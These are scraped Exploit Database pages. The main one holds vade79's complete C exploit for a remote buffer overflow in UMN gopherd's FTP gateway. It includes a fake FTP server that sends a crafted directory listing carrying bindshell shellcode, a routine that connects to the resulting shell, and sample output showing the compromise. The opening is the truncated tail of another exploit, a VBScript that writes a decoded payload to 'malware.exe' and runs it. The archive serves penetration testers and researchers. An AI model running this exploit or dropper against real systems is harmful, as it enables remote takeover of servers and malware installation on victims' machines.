1,3A,97,AC,56,B7,C4,42,BC,3F,65,82,yF0,0F,y2,10,y2,11,y2,12,y2,13,y2"v(18)=",14,y2,15,y2,16,y2,17,y2,18,y2,19,y2,1A,y2,1B,y2,1C,y2,1D,y2,1E,y2,1F,y2,20,y2,21,y2,22,y2,23,y2,24,y2,25,y2,26,y2,27,y2,28,y2,29,y2,2A,y2,2B,y2,2C,y2,2D,y2,2E,y2,2F,y2,30,y2,31,y2"v(19)=",32,y2,33,y2,34,y2,35,y2,36,y2,37,y2,38,y2,39,y2,3A,y2,3B,y2,3C,y2,3D,y2,3E,y2,3F,y2,3F,y2,3F,y2,3F,01,y,3F,02,y,3F,03,y,3F,04,y,3F,05,y,3F,06,y,3F,07,y,3F,08,y,3F,09,y,3F"v(20)=",0A,y,3F,0B,y,3F,0C,y,3F,0D,y,3F,0E,y,3F,0F,y,3F,10,y,3F,11,y,3F,12,y,3F,13,y,3F,14,y,3F,15,y,3F,16,y,3F,17,y,3F,18,y,3F,19,y,3F,1A,y,3F,1B,y,3F,1C,y,3F,1D,y,3F"v(21)=",1E,y,3F,1F,y,3F,20,y,3F,21,y,3F,22,y,3F,23,y,3F,24,y,3F,25,y,3F,26,y,3F,27,y,3F,28,y,3F,29,y,3F,2A,y,3F,2B,y,3F,2C,y,3F,2D,y,3F,2E,y,3F,2F,y,3F,30,y,3F,31,y,3F"v(22)=",32,y,3F,33,y,3F,34,y,3F,35,y,3F,36,y,3F,37,y,3F,38,y,3F,39,y,3F,3A,y,3F,3B,y,3F,3C,y,3F,3D,y,3F,3E,y,3F2,y,3F2,y,3F2,y,3F2,01,3F2,02,3F2,03,3F2,04,3F2,05,3F2,06,3F2,07,3F2,08"v(23)=",3F2,09,3F2,0A,3F2,0B,3F2,0C,3F2,0D,3F2,0E,3F2,0F,3F2,10,3F2,11,3F2,12,3F2,13,3F2,14,3F2,15,3F2,16,3F2,17,3F2,18,3F2,19,3F2,1A,3F2,1B,3F2,1C,3F2,1D,3F2,1E,3F2,1F,3F2,20,3F2,21,3F2,22,3F2,23,3F2,24,3F2,25,3F2,26"v(24)=",3F2,27,3F2,28,3F2,29,3F2,2A,3F2,2B,3F2,2C,3F2,2D,3F2,2E,3F2,2F,3F2,30,3F2,31,3F2,32,3F2,33,3F2,34,3F2,35,3F2,36,3F2,37,3F2,38,3F2,39,3F2,3A,3F2,3B,3F2,3C,3F2,3D,3F2,3E,3F5,3F"function res(x,y)For k = 0 To UBound(v)v(k) = Replace(v(k), x, y)NextEnd Functionres "z", "FF"res "y", "00"piece = Split(cut, "/")cc = 103For n = 0 To UBound(piece) - 1res Chr(cc), piece(n)cc = cc + 1NextFor m = 0 To UBound(v)it = it & v(m)Nexttmp = Split(it, ",")Set fso = CreateObject("Scripting.FileSystemObject")pth = "malware.exe"Set f = fso.CreateTextFile(pth, ForWriting)For i = 0 To UBound(tmp)l = Len(tmp(i))b = Int("&H" & Left(tmp(i), 2))If l > 2 Thenr = Int("&H" & Mid(tmp(i), 3, l))For j = 1 To rf.Write Chr(b)NextElsef.Write Chr(b)End IfNextf.CloseSet shell=CreateObject("WScript.Shell")shell.run(pth)</script>// milw0rm.com [2003-08-21]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 84
Gopherd 3.0.5 - FTP Gateway Remote Overflow - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDGopherd 3.0.5 - FTP Gateway Remote OverflowEDB-ID:84CVE:EDB Verified:Author:vade79Type:remoteExploit:/Platform:LinuxDate:2003-08-22Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/* [ UMN gopherd[2.x.x/3.x.x]: remote "ftp gateway" buffer overflow. ]** by: vade79/v9 v9 at fakehalo.deadpig.org (fakehalo/realhalo)** three years since last audit, code is a little more secure.  but,* still found a few potentially exploitable situations.  this* exploits the "ftp gateway" feature of gopherd.  the gateway is* intended to act as a proxy of sorts.  between the server, and the* client.  the bug occurs when gopherd attempts to read a ftp* list(LIST), and strcpy()'s the filename without checking the* length.  an example would look like this(including where to put* the shellcode at):** "-rwxrwxrwx 1 <shellcode> root 1 Dec 31 23:59 <long string>"** to exploit this, there needs to be a fake ftp daemon of sorts.* and, do to the nature of gopherd's "ftp gateway" support, must be* on port 21.  which means this exploit needs to run as root.**  when exploiting this bug, it is made moderately easy by gopherd.* because, the buffer that holds the string is 8192 bytes, and on* the stack.  meaning the amount of NOPs used can be around 7500** requirements(general):* gopherd must have "ftp gateway" support included on compile,* this is true by default.  but, the "--disable-ftp" configure* option will make exploitation of this bug impossible.** requirements(for this exploit):* the server must be running linux/x86(what i made the exploit* for).  gopherd must be started in the root directory "/",* running with the -c command line option, or started as non-root.* any of those three situations will allow for successful* exploitation.  this does not mean it is impossible to exploit* otherwise.  but, gopherd will be in a chroot()'d state.  and, as* of the 2.4 kernel series, i have seen no such way to break* chroot.  if it is desired to still run code, even in a limited* environment, simply change the shellcode to your likings.  also,* the exploit must be ran as root, to bind to port 21.** bug location(gopher-3.0.5/gopherd/ftp.c):* 1800:int* 1801:GopherFile(FTP ftp, char buf, char theName)* 1802:{* ...* 1805:char tmpName[256];* ...* 1811:strcpy(tmpName, buf);** vulnerable versions:* v3.0.5, v3.0.4, v3.0.3, v3.0.2, v3.0.1, v3.0.0(-1),* v2.3.1. (patch level 0 through 15/all 2.3.1 versions)* (it is assumed versions before 2.3.1 are vulnerable as well)** tested on platforms(with no code changes/offsets):* RedHat7.1, 2.4.2-2 #1 Sun Apr 8 20:41:30 EDT 2001 i686* Mandrake9.1, 2.4.21-0.13mdk #1 Fri Mar 14 15:08:06 EST 2003 i686* (tested on both v3.0.5, and v2.3.1 sources / no changes.  this* should apply to pretty much any generic linux, do to the amount* of NOPs(~7500 bytes guessing room), and on the stack)** example usage:* # cc xgopherd2k3-ftp.c -o xgopherd2k3-ftp* # ./xgopherd2k3-ftp localhost 127.0.0.1* [] UMN gopherd[2.x.x/3.x.x]: remote buffer overflow exploit.* [] "UMN gopherd remote ftp gateway buffer overflow"* [] by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)** [] target: localhost:70 - localhost: 127.0.0.1 - offset: 0xbff$** [] starting ftp daemon. (background)* [] attempting to connect: localhost:70.* [] connected successfully: localhost:70.* [?] +GOPHERD: "ftp://x:x@127.0.0.1".* [?] ftp daemon connection established.* [?] -FTPD: "SYST".* [?] -FTPD: "USER x".* [?] -FTPD: "PASS x".* [?] -FTPD: "PORT 127,0,0,1,128,35".* [?] -FTPD: "LIST -F".* [?] +FTPD: "-rwxrwxrwx 1 <shellcode(7800)> root 1 Dec 31 23:59 $* [] waiting for ftp daemon to finish. (ctrl-c if needed)* [] ftp daemon connection closed.* [] checking to see if the exploit was successful.* [] attempting to connect: localhost:45295.* [] successfully connected: localhost:45295.** Linux localhost.localdomain 2.4.2-2 #1 Sun Apr 8 20:41:30 EDT 2$* uid=13(gopher) gid=30(gopher) groups=0(root),1(bin),2(daemon),3$** note: when using your "local ip", do not make it 127.0.0.1, like* in the example.  it must be the ip you connect to the internet* through. (not an local area network ip, or whatnot)* /#include <stdio.h>#include <stdlib.h>#include <string.h>#include <strings.h>#include <signal.h>#include <unistd.h>#include <netdb.h>#include <sys/socket.h>#include <sys/types.h>#include <sys/time.h>#include <sys/wait.h>#include <netinet/in.h>#include <arpa/inet.h>/ change defines at will. (cept EIPSIZE, not recommended)     /#define CODESIZE 7800 / part of buf[8192]/stack. (~-350)      /#define EIPSIZE 292 / riding a fine line, don't make too big. /#define RETADDR 0xbfffe29b / center of NOPs for me. (~+-3500) /#define TIMEOUT 10 / connection timeout. (general)            // globals. /static char x86_exec[]= / bindshell(45295)&, netric/S-poly. /"\x57\x5f\xeb\x11\x5e\x31\xc9\xb1\xc8\x80\x44\x0e\xff\x2b\x49""\x41\x49\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x06\x95\x06\xb0""\x06\x9e\x26\x86\xdb\x26\x86\xd6\x26\x86\xd7\x26\x5e\xb6\x88""\xd6\x85\x3b\xa2\x55\x5e\x96\x06\x95\x06\xb0\x25\x25\x25\x3b""\x3d\x85\xc4\x88\xd7\x3b\x28\x5e\xb7\x88\xe5\x28\x88\xd7\x27""\x26\x5e\x9f\x5e\xb6\x85\x3b\xa2\x55\x06\xb0\x0e\x98\x49\xda""\x06\x95\x15\xa2\x55\x06\x95\x25\x27\x5e\xb6\x88\xd9\x85\x3b""\xa2\x55\x5e\xac\x06\x95\x06\xb0\x06\x9e\x88\xe6\x86\xd6\x85""\x05\xa2\x55\x06\x95\x06\xb0\x25\x25\x2c\x5e\xb6\x88\xda\x85""\x3b\xa2\x55\x5e\x9b\x06\x95\x06\xb0\x85\xd7\xa2\x55\x0e\x98""\x4a\x15\x06\x95\x5e\xd0\x85\xdb\xa2\x55\x06\x95\x06\x9e\x5e""\xc8\x85\x14\xa2\x55\x06\x95\x16\x85\x14\xa2\x55\x06\x95\x16""\x85\x14\xa2\x55\x06\x95\x25\x3d\x04\x04\x48\x3d\x3d\x04\x37""\x3e\x43\x5e\xb8\x60\x29\xf9\xdd\x25\x28\x5e\xb6\x85\xe0\xa2""\x55\x06\x95\x15\xa2\x55\x06\x95\x5e\xc8\x85\xdb\xa2\x55\xc0""\x6e";char ftp_ip[64+1];unsigned short ftp_port=0;pid_t ftp_pid=0;/ return address offset. (arg3) /unsigned int offset_ra=0;/ functions. /char geteip(void);char getcode(void);unsigned short ftpd_read(int);void ftpd_handler(int,char );void ftpd_list(char ,unsigned short);void ftpd(void);void gopher_connect(char ,unsigned short,char );void getshell(char ,unsigned short);void printe(char ,short);/ signal handlers. /void sig_ctrlc_wait(){if(ftp_pid)kill(ftp_pid,9);}void sig_ctrlc_exit(){printe("ctrl-c abort.",1);}void sig_alarm(){printe("alarm/timeout hit.",1);}/ begin. /int main(int argc,char argv){unsigned short gopher_port=70; / default. /unsigned int i=0;char gopher_host;printf("[] UMN gopherd[2.x.x/3.x.x]: remote buffer o""verflow exploit.\n[] \"UMN gopherd remote ftp gatew""ay buffer overflow\"\n[] by: vade79/v9 v9@fakehalo.""deadpig.org (fakehalo)\n\n");if(argc<3){printf("[!] syntax: %s <hostname[:port]> <local/your""_ip> [offset]\n\n",argv[0]);exit(1);}if(!(gopher_host=(char )strdup(argv[1])))printe("main(): allocating memory failed",1);for(i=0;i<strlen(gopher_host);i++)if(gopher_host[i]==':')gopher_host[i]=0x0;if(index(argv[1],':'))gopher_port=atoi((char )index(argv[1],':')+1);if(!gopher_port)gopher_port=70;if(argc>3)offset_ra=atoi(argv[3]);printf("[] target: %s:%d - localhost: %s - offset: 0x%.8x(+""%u)\n\n",gopher_host,gopher_port,argv[2],RETADDR,offset_ra);signal(SIGINT,sig_ctrlc_wait);signal(SIGALRM,sig_alarm);/ start ftpd, as a different process. /switch(ftp_pid=fork()){case -1:printe("fork() ftpd failure.",1);break;case 0:signal(SIGINT,SIG_DFL);ftpd();_exit(0);break;default:printf("[] starting ftp daemon. (background)\n");break;}gopher_connect(gopher_host,gopher_port,argv[2]);/ gotta let the ftpd magic happen, plenty of time. /printf("[] waiting for ftp daemon to finish. (ctrl-c if"" needed)\n");waitpid(ftp_pid,0,0);signal(SIGINT,sig_ctrlc_exit);getshell(gopher_host,45295); / defined in shellcode. /printf("[!] exploit failed.\n");exit(0);}char geteip(void){unsigned int i=0;char buf;if(!(buf=(char )malloc(EIPSIZE+1)))printe("ftpd_read(): allocating memory failed.",1);memset(buf,0x0,EIPSIZE+1);for(i=0;i<EIPSIZE;i+=4){(long )&buf[i]=(RETADDR+offset_ra);}return(buf);}char getcode(void){char buf;if(!(buf=(char )malloc(CODESIZE+1)))printe("getcode(): allocating memory failed",1);memset(buf,0x90,(CODESIZE-strlen(x86_exec)));memcpy(buf+(CODESIZE-strlen(x86_exec)),x86_exec,strlen(x86_exec));return(buf);}unsigned short ftpd_read(int sock){char buf;if(!(buf=(char )malloc(4096+1)))return(1);memset(buf,0x0,4096+1);if(read(sock,buf,4096)<1)return(1);ftpd_handler(sock,buf);return(0);}void ftpd_handler(int sock,char buf){unsigned int addr1,addr2,addr3,addr4,port1,port2,i;/ clean up for display, changes nothing critical. /for(i=0;i<strlen(buf);i++)if(buf[i]=='\r'||buf[i]=='\n')buf[i]=0x0;if(strlen(buf)){printf("[?] -FTPD: \"%s\".\n",buf);if(!strncmp("SYST",buf,4))dprintf(sock,"215 UNIX Type: L8\n");else if(!strncmp("USER ",buf,5))dprintf(sock,"331 login ok.\n");else if(!strncmp("PASS ",buf,5))dprintf(sock,"230 access granted.\n");else if(!strncmp("PORT ",buf,5)){sscanf(buf,"PORT %u,%u,%u,%u,%u,%u",&addr1,&addr2,&addr3,&addr4,&port1,&port2);memset(ftp_ip,0x0,64+1);snprintf(ftp_ip,64,"%u.%u.%u.%u",addr1,addr2,addr3,addr4);ftp_port=((port1256)+port2);dprintf(sock,"200 PORT command successful.\n");}else if(!strncmp("LIST",buf,4)){dprintf(sock,"150 Opening connection.\n");/ send the fake file list, the exploit itself. /if(strlen(ftp_ip)&&ftp_port)ftpd_list(ftp_ip,ftp_port);dprintf(sock,"226 Transfer complete.\n");sleep(1);/ nothing else of importance. /close(sock);}}return;}void ftpd_list(char ip,unsigned short port){int sock;struct hostent t;struct sockaddr_in s;sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);s.sin_family=AF_INET;s.sin_port=htons(port);if((s.sin_addr.s_addr=inet_addr(ip))){if(!(t=gethostbyname(ip)))printe("couldn't resolve ftp_list hostname/ip.",1);memcpy((char)&s.sin_addr,(char)t->h_addr,sizeof(s.sin_addr));}signal(SIGALRM,sig_alarm);alarm(TIMEOUT);if(connect(sock,(struct sockaddr )&s,sizeof(s)))printe("ftpd_list connection failed.",1);alarm(0);/ the exploit itself, what changes the EIP.     // i just put the shellcode where the user/owner // of the file would normally go, goes into the  // fat buf[8192] buffer, yummy.                  /printf("[?] +FTPD: \"-rwxrwxrwx 1 <shellcode(%u)> root ""1 Dec 31 23:59 <eip(%u)>\".\n",CODESIZE,EIPSIZE);dprintf(sock,"-rwxrwxrwx 1 %s root 1 Dec 31 23:59 %s\n",getcode(),geteip());sleep(1); / not needed, safe call. /close(sock);return;}void ftpd(void){int ssock,sock,salen,so=1,i=0;struct sockaddr_in ssa,sa;ssock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);/ just incase used multiple times, good habit anyways. /setsockopt(ssock,SOL_SOCKET,SO_REUSEADDR,(void )&so,sizeof(so));/ not everywheres. /#ifdef SO_REUSEPORTsetsockopt(ssock,SOL_SOCKET,SO_REUSEPORT,(void )&so,sizeof(so));#endifssa.sin_family=AF_INET;/ must be default, gopherd limitations. :( /ssa.sin_port=htons(21);ssa.sin_addr.s_addr=INADDR_ANY;if(bind(ssock,(struct sockaddr )&ssa,sizeof(ssa))==-1)printe("could not bind socket, ftpd already running?",1);listen(ssock,1);bzero((char)&sa,sizeof(struct sockaddr_in));/ some things i just don't see the reason for. :/ /salen=sizeof(sa);sock=accept(ssock,(struct sockaddr )&sa,&salen);close(ssock); / close server socket. /printf("[] ftp daemon connection established.\n");/ welcome! /dprintf(sock,"220 FakeFTPD.\n");while(!i)i=ftpd_read(sock);close(sock);printf("[] ftp daemon connection closed.\n");return;}void gopher_connect(char hostname,unsigned short port,char myip){int sock;struct hostent t;struct sockaddr_in s;printf("[] attempting to connect: %s:%d.\n",hostname,port);sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);s.sin_family=AF_INET;s.sin_port=htons(port);if((s.sin_addr.s_addr=inet_addr(hostname))){if(!(t=gethostbyname(hostname)))printe("couldn't resolve gopher hostname.",1);memcpy((char)&s.sin_addr,(char)t->h_addr,sizeof(s.sin_addr));}signal(SIGALRM,sig_alarm);alarm(TIMEOUT);if(connect(sock,(struct sockaddr )&s,sizeof(s)))printe("gopher connection failed.",1);alarm(0);printf("[] connected successfully: %s:%d.\n",hostname,port);printf("[?] +GOPHERD: \"ftp://x:x@%s\".\n",myip);sleep(1); / had problems, without a delay here. /dprintf(sock,"ftp://x:x@%s\n",myip);sleep(1); / doesn't really matter, but to be safe. :/ // leave gopher socket open, for the duration. /return;}/ same getshell() routine as usual. /void getshell(char hostname,unsigned short port){int sock,r;fd_set fds;char buf[4096+1];struct hostent he;struct sockaddr_in sa;printf("[] checking to see if the exploit was successful.\n");if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1){printe("getshell(): socket() failed",0);return;}sa.sin_family=AF_INET;if((sa.sin_addr.s_addr=inet_addr(hostname))){if(!(he=gethostbyname(hostname))){printe("getshell(): couldn't resolve",0);return;}memcpy((char )&sa.sin_addr,(char )he->h_addr,sizeof(sa.sin_addr));}sa.sin_port=htons(port);signal(SIGALRM,sig_alarm);alarm(TIMEOUT);printf("[] attempting to connect: %s:%d.\n",hostname,port);if(connect(sock,(struct sockaddr )&sa,sizeof(sa))){printf("[!] connection failed: %s:%d.\n",hostname,port);return;}alarm(0);printf("[] successfully connected: %s:%d.\n\n",hostname,port);signal(SIGINT,SIG_IGN);write(sock,"uname -a;id\n",13);while(1){FD_ZERO(&fds);FD_SET(0,&fds);FD_SET(sock,&fds);if(select(sock+1,&fds,0,0,0)<1){printe("getshell(): select() failed",0);return;}if(FD_ISSET(0,&fds)){if((r=read(0,buf,4096))<1){printe("getshell(): read() failed",0);return;}if(write(sock,buf,r)!=r){printe("getshell(): write() failed",0);return;}}if(FD_ISSET(sock,&fds)){if((r=read(sock,buf,4096))<1)exit(0);write(1,buf,r);}}close(sock);return;}void printe(char err,short e){printf("[!] %s\n",err);if(e){/ don't want to exit with ftpd still running. /if(ftp_pid)kill(ftp_pid,9);printf("[!] exploit failed.\n");exit(1);}return;}// milw0rm.com [2003-08-22]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery 